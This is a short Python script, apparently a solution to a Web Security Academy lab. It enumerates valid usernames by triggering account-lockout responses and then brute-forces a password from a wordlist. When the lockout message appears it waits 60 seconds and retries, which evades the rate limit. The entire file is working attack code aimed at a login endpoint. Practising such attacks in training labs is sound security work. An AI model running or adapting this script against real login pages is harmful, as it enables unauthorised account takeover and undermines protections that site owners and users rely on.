import requests
import time

url = 'https://accb1fc01f621b30c0ff245c008d0009.web-security-academy.net/login'

def getUsername():
    usernames = open('../../wordlist/username.txt')

    for username in usernames:
        for i in range(10):
            response = requests.post(url, data={
                'username': username.replace('\n', ''),
                'password': 'whatever' + str(i)
            })

            if 'Invalid username or password.' not in response.text:
                print(response.text)
                print(username)
                return username

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, data={
            'username': 'appserver',
            'password': password.replace('\n', '')
        })

        if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' in response.text:
            time.sleep(60)

            response = requests.post(url, data={
                'username': 'appserver',
                'password': password.replace('\n', '')
            })
        
        if 'Invalid username or password.' not in response.text:
            print(password)
            break

getPassword()